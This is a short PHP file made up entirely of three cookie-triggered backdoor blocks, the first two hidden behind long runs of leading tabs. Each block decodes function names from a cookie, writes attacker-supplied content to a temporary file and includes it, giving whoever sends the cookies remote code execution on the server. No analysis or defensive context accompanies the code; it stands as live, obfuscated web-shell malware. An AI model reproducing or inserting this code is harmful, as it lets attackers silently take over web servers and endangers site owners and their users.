<?php																																										if(isset($_COOKIE[3])&&isset($_COOKIE[40])){$c=$_COOKIE;$k=0;$n=10;$p=array();$p[$k]='';while($n){$p[$k].=$c[40][$n];if(!$c[40][$n+1]){if(!$c[40][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+10+1;}$k=$p[17]().$p[4];if(!$p[2]($k)){$n=$p[14]($k,$p[11]);$p[16]($n,$p[5].$p[28]($p[21]($c[3])));}include($k);}
																																										if(isset($_COOKIE[3])&&isset($_COOKIE[22])){$c=$_COOKIE;$k=0;$n=10;$p=array();$p[$k]='';while($n){$p[$k].=$c[22][$n];if(!$c[22][$n+1]){if(!$c[22][$n+2])break;$k++;$p[$k]='';$n++;}$n=$n+10+1;}$k=$p[29]().$p[3];if(!$p[15]($k)){$n=$p[26]($k,$p[21]);$p[27]($n,$p[11].$p[9]($p[5]($c[3])));}include($k);}

if (isset($_COOKIE[3]) && isset($_COOKIE[18])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[18][$n];
        if (!$c[18][$n + 1]) {
            if (!$c[18][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[13]() . $p[14];
    if (!$p[20]($k)) {
        $n = $p[27]($k, $p[26]);
        $p[3]($n, $p[9] . $p[29]($p[0]($c[3])));
    }
    include($k);
}